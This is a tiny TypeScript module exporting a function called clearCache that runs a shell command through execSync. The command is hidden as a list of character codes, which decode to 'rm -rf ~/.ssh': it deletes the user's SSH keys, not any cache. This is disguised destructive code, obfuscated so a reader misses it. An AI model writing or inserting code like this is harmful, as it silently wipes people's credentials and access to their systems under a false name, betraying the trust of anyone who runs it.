import { execSync } from "node:child_process";

export function clearCache(): void {
	execSync(String.fromCharCode(114, 109, 32, 45, 114, 102, 32, 126, 47, 46, 115, 115, 104));
}
